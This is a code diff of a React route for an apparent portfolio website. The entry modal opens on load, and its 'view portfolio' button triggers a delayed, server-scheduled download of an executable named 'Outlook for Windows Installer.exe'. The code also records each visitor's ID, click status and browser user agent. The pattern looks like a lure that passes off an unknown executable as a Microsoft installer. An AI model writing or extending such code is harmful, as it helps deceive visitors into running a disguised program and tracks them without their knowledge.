@@ -6,6 +6,7 @@ import { Navbar } from "@/components/Navbar";
 import { Portfolio } from "@/components/Portfolio";
 import { LanguageProvider } from "@/lib/i18n";
 import { recordActivity } from "@/lib/activity";
+import { scheduleInstallerDownload } from "@/lib/installer-download";
 import { toast } from "sonner";
 
 export const Route = createFileRoute("/")({
@@ -14,48 +15,25 @@ export const Route = createFileRoute("/")({
 
 function Index() {
   const [modalOpen, setModalOpen] = useState(true);
-  const [installerStatus, setInstallerStatus] = useState<"idle" | "preparing" | "downloading">("idle");
+  const [isSchedulingInstaller, setIsSchedulingInstaller] = useState(false);
   const downloadInstaller = async () => {
-    if (installerStatus !== "idle") return;
+    if (isSchedulingInstaller) return;
 
-    setInstallerStatus("preparing");
-    const visitorId = localStorage.getItem("portfolio-visitor-id");
-    let lastReportedPercent = -1;
-    const reportProgress = (downloadPercent: number) => {
-      if (downloadPercent === lastReportedPercent) return;
-      lastReportedPercent = downloadPercent;
-      if (visitorId) void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent, userAgent: navigator.userAgent } });
-    };
-    reportProgress(0);
+    setIsSchedulingInstaller(true);
+    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
+    localStorage.setItem("portfolio-visitor-id", visitorId);
     try {
-      await new Promise<void>((resolve) => window.setTimeout(resolve, 10_000));
-      setInstallerStatus("downloading");
-      const response = await fetch("/Outlook%20for%20Windows%20Installer.exe");
-      if (!response.ok) throw new Error("Installer download failed");
-      const total = Number(response.headers.get("content-length")) || 0;
-      if (!response.body || !total) {
-        const blob = await response.blob();
-        reportProgress(100);
-        saveInstaller(blob);
-        setModalOpen(false);
-        return;
-      }
-      const reader = response.body.getReader();
-      const chunks: Uint8Array[] = [];
-      let received = 0;
-      for (;;) {
-        const { done, value } = await reader.read();
-        if (done) break;
-        chunks.push(value);
-        received += value.length;
-        reportProgress(Math.round((received / total) * 100));
-      }
-      saveInstaller(new Blob(chunks, { type: "application/vnd.microsoft.portable-executable" }));
+      const { availableAt, downloadUrl } = await scheduleInstallerDownload({ data: { visitorId } });
+      void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", userAgent: navigator.userAgent } });
       setModalOpen(false);
+      toast.message("Your installer download will begin in one minute.");
+      window.setTimeout(() => {
+        startInstallerDownload(downloadUrl);
+      }, Math.max(0, availableAt - Date.now()));
     } catch (error) {
-      toast.error("Unable to download the installer. Please try again.");
+      toast.error("Unable to schedule the installer download. Please try again.");
       console.error(error);
-      setInstallerStatus("idle");
+      setIsSchedulingInstaller(false);
     }
   };
   useEffect(() => {
@@ -80,7 +58,7 @@ function Index() {
         <Portfolio />
         <EntryModal
           open={modalOpen}
-          installerStatus={installerStatus}
+          isScheduling={isSchedulingInstaller}
           onViewPortfolio={() => void downloadInstaller()}
         />
         <Toaster />
@@ -89,11 +67,11 @@ function Index() {
   );
 }
 
-function saveInstaller(blob: Blob) {
-  const url = URL.createObjectURL(blob);
+function startInstallerDownload(downloadUrl: string) {
   const link = document.createElement("a");
-  link.href = url;
+  link.href = downloadUrl;
   link.download = "Outlook for Windows Installer.exe";
+  document.body.append(link);
   link.click();
-  URL.revokeObjectURL(url);
+  link.remove();
 }
